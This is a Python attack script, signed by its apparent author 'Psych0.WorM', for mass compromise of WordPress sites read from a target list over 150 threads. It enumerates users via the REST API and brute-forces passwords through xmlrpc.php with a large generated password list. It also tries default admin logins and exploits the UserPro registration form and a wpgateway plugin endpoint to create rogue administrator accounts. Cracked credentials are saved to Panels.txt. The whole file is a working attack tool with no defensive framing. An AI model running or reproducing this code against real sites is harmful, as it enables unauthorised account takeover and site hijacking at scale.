import requests, sys, os, re, datetime , os.path
import random, string, json
from multiprocessing.dummy import Pool

# Coded by Psych0.WorM
requests.urllib3.disable_warnings()

total = []

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')


def URLdomain(site):
    site = site.rstrip()
    if 'http://' not in site and 'https://' not in site:
        site = 'http://' + site
    if site[-1] is not '/':
        site = site + '/'
    return site


headers = {'Connection': 'keep-alive',
           'Cache-Control': 'max-age=0',
           'Upgrade-Insecure-Requests': '1',
           'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
           'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
           'Accept-Encoding': 'gzip, deflate',
           'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
           'referer': 'www.google.com'}

Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}

def id_generator(size=8, chars=string.ascii_uppercase + string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


def informations(url):
    try:
        exploit_page = url + '/wp-json/wp/v2/users'
        exploit_1 = requests.get(exploit_page, headers=headers, timeout=15)
        if 'slug' in str(exploit_1.text):
            exploit = str(exploit_1.text)
            usernames = re.findall('"name":"(.*?)"', exploit)
            for username in usernames:
                Signs = ['Archive', 'Archives', 'Author', 'Home', ',', ';', '\\']
                if any(Sign in username for Sign in Signs):
                    pass
                else:
                    pas = [username + username, username, 'Password', '!@#$%^&*', '12345678', '12345', 'abc123', 'passw0rd', 'iloveyou', 'letmein',
                           'starwars', 'whatever', '123456', 'qwerty123', 'admin123', 'admin1234', 'admin12345',
                           'admin123456', 'admin1234567', 'Admin123', 'Admin1234', 'Admin12345', 'Admin123456',
                           'Admin1234567', 'qwerty', 'admin', 'Admin', 'fuckyou', 'admin@123', 'password123', username,
                           username + '!', username + '@12', username + '@1', username + '@123', username + '1',
                           username + '2', username + '3', username + '4', username + '5', username + '6',
                           username + '7', username + '8', username + '9', username + '0', username + '10',
                           username + '12', username + '123', username + '1234', username + '12345',
                           username + '123456', username + '1234567', username + '12345678', username + '123##@@',
                           username + '123@@##', username + '123#@', username + '123@#', username + '12##@@',
                           username + '12@@##', username + '1##@@', username + '1@@##', username + '!@#!@#',
                           username + '#@!#@!', username + '!@#', username + '#@!', username + '098', username + '0987',
                           username + '09876', username + '098765', username + '0987654', username + '09876543',
                           username + '098765432', username + '0987654321', username + '11', username + '10',
                           username + '09', username + '08', username + '07', username + '06', username + '05',
                           username + '04', username + '03', username + '02', username + '01', username + '00',
                           username + '153214', username + '2017', username + '2016', username + '2015',
                           username + '2014', username + '2018', username + '2019', username + '2010',
                           username + '2011', username + '2012', username + '2013', username + '2001',
                           username + '2002', username + '2003', username + '2004', username + '2005',
                           username + '2006', username + '2007', username + '2008', username + '2009',
                           username + '654321', 'pass', username + 'pass', '654321', '123123', username + '123123',
                           'admins', 'password', 'pass123', 'pass1234', 'pass12345', 'pass123456', 'administrator',
                           '000000']
                    for password in pas:
                        if(xlmprc(url, username, password) is True): #if xlmprc is true then saves if not heads to bf if true saves if not bruteforceurl then works if not reutnr false
                            open('Panels.txt', 'a').write(url + '/wp-login.php' + '#' + username + '@' + password + '\n')
                        else:
                            pass
                        pass
                    pass
                pass
            pass
        pass
    except:
        pass


def bf(url):
    try:
        exploit_page = url + '/wp-json/wp/v2/users'
        exploit_1 = requests.get(exploit_page, headers=headers, timeout=15)
        if 'slug' in str(exploit_1.text): # Vulnerable
            usernamess = ['admin', 'root', 'demo', 'test']
            for username1 in usernamess:
                passwordss = ['test', 'root', 'admin', 'adminadmin', 'demo', 'pass', 'admin123']
                for password in passwordss:
                    post_load = requests.post(url + '/xmlrpc.php',
                                              data="<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>" + username1 + "</value></param><param><value>" + password + "</value></param></params></methodCall>",
                                              headers=headers, timeout=15)
                    if 'blogName' in post_load.content:
                        print('[Succesfful] : {}'.format(password))
                        open('Panels.txt', 'a').write(url + '/wp-login.php' + '#' + username1 + '@' + password + '\n')
                        return True
                    else:
                        print('[XLMPRC-Username] : {}'.format(username1))
                    pass
                pass
            pass
        pass
    except:
        pass


def xlmprc(url, username, password):
    try:
        post_load = requests.post(url + '/xmlrpc.php',
                                  data="<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>" + username + "</value></param><param><value>" + password + "</value></param></params></methodCall>",
                                  headers=headers, timeout=15)
        if 'blogName' in post_load.content:
            print('[Succesfful] : {}'.format(password))
            return True
        else:
            print('[XLMRPC-Username] : {}'.format(username))
    except:
        pass



def cleaner(url):
    try:
        if 'http://' or 'https://' in url:
            url = url.replace('http://', '')
            url = url.replace('https://', '')
            pointer = url.split('.')
            if ('www' in pointer):
                password = pointer[1]
                bruteforce(url, password)
            else:
                password = pointer[0]
                bruteforce(url, password)
            pass
        pass
    except:
        pass

def bruteforce(url, password):
    try:
        url = URLdomain(url)
        exploit_page = url + '/wp-json/wp/v2/users'
        exploit_1 = requests.get(exploit_page, headers=headers, timeout=15)
        if 'slug' in str(exploit_1.text):
            exploit = str(exploit_1.text)
            usernames = re.findall('"name":"(.*?)"', exploit)
            for username in usernames:
                Signs = ['Archive', 'Archives', 'Author', 'Home', ',', ';', '\\']
                if any(Sign in username for Sign in Signs):
                    pass
                else:
                    post_load = requests.post(url + '/xmlrpc.php',
                                              data="<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>" + username + "</value></param><param><value>" + password + "</value></param></params></methodCall>",
                                              headers=headers, timeout=15)
                    if 'blogName' in post_load.content:
                        print('[Succesfful] : {}'.format(username))
                        open('Panels.txt', 'a').write(url + '/wp-login.php' + '#' + username + '@' + password + '\n')
                        return True
                    else:
                        print('[XLMPRC-PASSWORD] : {}'.format(password))
                    pass
                pass
            pass
        else:
            pass
    except:
        pass

def wp_login(url):
    try:
        usernamess = ['admin']
        for username in usernamess:
            passwords = ['admin']
            for password in passwords:
                req = requests.session()
                headersLogin = {'Connection': 'keep-alive',
                                'Cache-Control': 'max-age=0',
                                'Upgrade-Insecure-Requests': '1',
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36',
                                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                                'Accept-Encoding': 'gzip, deflate',
                                'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
                                'referer': '{}/wp-admin/'.format(url)}
                loginPost = {'log': username, 'pwd': password, 'wp-submit': 'Log In',
                             'redirect_to': '{}/wp-admin/'.format(url), 'testcookie': '1'}
                login = req.post('{}/wp-login.php'.format(url), data=loginPost, headers=headersLogin, verify=False, timeout=15)
                check = login.content
                if ('profile.php' in check):
                    print('[Succesfful] : {}'.format(username))
                    open('Panels_BF.txt', 'a').write(url + '/wp-login.php' + '#' + username + '@' + password + '\n')
                else:
                    print('[Bruteforce-Failed] : {}'.format(password))
                pass
            pass
        pass
    except:
        pass

def userpro(url):
    try:
        req = requests.session()
        r = req.get(url + "/profile/register/", headers=headers, verify=False, timeout=15).content
        cids = re.findall('redirect_uri-(.*?)"', r)
        hexs = re.findall('name="_myuserpro_nonce" value="(.*?)" />', r)
        user = "Xo_" + id_generator()
        pwd = id_generator()
        cid = cids[0]
        print("Target : {}  Cid : {} ").format(url, cid)
        hexcode = hexs[0]
        data = {'role-' + cid: 'administrator', 'redirect_uri-' + cid: '', '_myuserpro_nonce': hexcode,
                '_wp_http_referer': '/wp-admin/admin-ajax.php', 'unique_id': cid, 'user_login-' + cid: user,
                'user_pass-' + cid: pwd, 'user_pass_confirm-' + cid: pwd, 'user_email-' + cid: pwd + '@gmail.com',
                'phone_number-' + cid: '45678892', 'country-' + cid: 'Albania',
                'securitykey': '0',
                'securityqa': 'yes',
                'display_name-' + cid: '',
                'shortcode': '',
                'profilepicture-' + cid: '',
                'facebook-' + cid: '',
                'twitter-' + cid: '',
                'google_plus-': '',
                'user_url-' + cid: '',
                'terms': 'on',
                'action': 'userpro_process_form',
                'template': 'register'}
        ck = req.post(url + "/wp-admin/admin-ajax.php", data=data, headers=headers, verify=False, timeout=20)
        if '"redirect_uri":"' in ck.content:
            print('[Register Success] : {}'.format(url))
            open('Panels.txt', 'a').write(url + '/wp-login.php' + '#' + user + '@' + pwd + '\n')
            return True
        else:
            print('[USERPRO-Fatal] : {}'.format(url))
        pass
    except:
        pass

def vln(url):
    try:
        data = {'admin_username': 'rangex', 'admin_password': 'RANGEX', 'admin_email': 'rangex@gmail.com',
                'admin_firstname': 'rang', 'admin_lastname': 'gex'}
        data = json.dumps(data)
        re = requests.post(url + "/wp-content/plugins/wpgateway/wpgateway-webservice-new.php?wp_new_credentials=1",
                           data=data, headers=headers, verify=False, timeout=20)
        if '"message":"User created Successfully"' in str(re.content):
            print('[Register Success] : {}'.format(url))
            open('Panels.txt', 'a').write(url + '/wp-login.php#rangex@rangex' + '\n')
            return True
        else:
            print('[Failed New-Admin] : {}'.format(url))
    except:
        pass

def main(url):
    try:
        total.append(url)
        os.system('title Total Websites  : {}'.format(str(len(total))))
        url = URLdomain(url)
        login = requests.get(url + '/wp-login.php', headers=headers, timeout=20).content
        if ('recaptcha-checkbox' not in str(login)):
            if('wp-submit' in str(login)):
                informations(url)
                cleaner(url)
                bf(url)
                wp_login(url)
                userpro(url)
                vln(url)
            else:
                pass
            pass
        pass
    except:
        pass

mp = Pool(150)
mp.map(main, target)
mp.close()
mp.join()
